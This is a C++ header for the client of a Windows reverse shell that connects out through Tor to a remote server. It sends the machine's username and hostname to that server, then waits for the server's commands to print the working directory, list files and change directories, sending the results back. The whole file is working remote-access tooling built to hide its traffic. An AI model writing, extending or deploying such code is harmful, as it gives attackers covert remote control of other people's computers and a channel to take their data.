#pragma once

#include "TorPlusPlus/torplusplus.hpp"

#include <string>
#include <Windows.h>
#include <lmcons.h>
#include <filesystem>

/*
    Contains code for connecting to the server and processing commands
*/
class torRevShellClient {
private:
    torPlusPlus::torSocketExtended torSock;
    std::string torPath;
    std::string servAddr;
    std::string publicIp;
    std::string username;
    std::string hostname;
    bool connected = false;

    /*
        Gets username + hostname.
        Will get public IP at some point in the future
    */
    void getComputerInfo() {
        // Get the username of the current user:
        TCHAR usernameTC[UNLEN + 1];
        DWORD usernameLen = UNLEN + 1;
        GetUserName(usernameTC, &usernameLen);
        std::wstring usernameWStr(&usernameTC[0]);
        this->username = std::string(usernameWStr.begin(), usernameWStr.end());
        // Get the computer hostname:
        TCHAR hostnameTC[UNLEN + 1];
        DWORD hostnameLen = UNLEN + 1; // Not sure if UNLEN+1 is actually the max length
        GetComputerName(hostnameTC, &hostnameLen);
        std::wstring hostnameWStr(&hostnameTC[0]);
        this->hostname = std::string(hostnameWStr.begin(), hostnameWStr.end());
        // Public IP filled with dummy data for now:
        this->publicIp = "0.0.0.0";
    }

    
public:

    /*
        Starts TOR and sets up some basic info
    */
    torRevShellClient(std::string torPath, std::string servAddr){
        this->torPath = torPath;
        this->servAddr = servAddr;
        this->getComputerInfo();
    }

    /*
        Attempts to start TOR using this->torPath
        Returns 0 on fail
    */
    bool startProxy() {
        return this->torSock.startAndConnectToProxy(this->torPath.c_str());
    }

    /*
        Attempts to make a connection to the server
        Returns true if a successful response from server is received ("<ip>;<username>;<hostname>;connected;")
    */
    bool attemptConnect() {
        this->torSock.connectToProxy();
        printf("Attempting to connect to %s\n", this->servAddr.c_str());
        this->torSock.connectProxyTo(this->servAddr.c_str());
        std::string connReq = this->publicIp + ";" + this->username + ";" + this->hostname + ";";
        this->torSock.proxySend(connReq.c_str(), connReq.size());
        char connResponseBuff[1024] = { 0 }; // 1kb should be enough :)
        this->torSock.proxyRecv(connResponseBuff, 1024);
        printf("Received response: %s\n", connResponseBuff);
        std::string connResponse = connResponseBuff; // Convert to std::string for easier handling
        this->connected = (connResponse == this->publicIp + ";" + this->username + ";" + this->hostname + ";" + "connected;");
        return this->connected;
    }
    
    /*
        This is essentially the "main()" for the server.
        Only runs if this->connected is true.
    */
    void cmdProcessLoop() {
        if (!this->connected) {
            return;
        }
        while (1) {
            char cmdBuff[1024] = { 0 };
            int bytesReceived = this->torSock.proxyRecv(cmdBuff, 1024);
            if (bytesReceived <= 0) {
                return;
            }
            std::string cmd = cmdBuff; // Convert for easier handling
            printf("CMD: %s\n", cmd.c_str());
            if (cmd == "ping;") {
                torSock.proxySend("ping;pong;", 11);
            }
            else if (cmd == "pwd;") {
                this->pwd();
            }
            else if (cmd == "ls;") {
                this->ls();
            }
            else if (cmd.starts_with("cd;")) {
                this->cd(cmd.substr(3, cmd.size() - 1));
            }
            else {
                std::string failResponse = "Received invalid command: " + cmd;
                torSock.proxySendStr(failResponse);
            }
        }
    }

    /*
        Command functions
        These are called by cmdProcessLoop()
    */

    void pwd() {
        // Get the current working directory
        TCHAR cwdTC[MAX_PATH] = { 0 };
        GetCurrentDirectory(MAX_PATH, cwdTC);
        std::wstring cwdWStr(&cwdTC[0]);
        std::string response = "pwd;" + std::string(cwdWStr.begin(), cwdWStr.end())+";";
        this->torSock.proxySendStr(response);
    }

    void ls() {
        // Get a list of the files and folders in the current directory
        std::string response = "ls;";
        for (const auto& entry : std::filesystem::directory_iterator(std::filesystem::current_path())) {
            response += entry.path().filename().string();
            if (entry.is_directory()) {
                response += "/";
            }
            response += ";";
        }
        this->torSock.proxySendStr(response);
    }

    void cd(std::string path){
        std::string response = "cd;";
        std::wstring pathWStr(path.begin(), path.end() - 1);
        BOOL success = SetCurrentDirectory(pathWStr.c_str());
        response += path + ((success) ? "success" : "failed");
        this->torSock.proxySendStr(response);
    }
    
};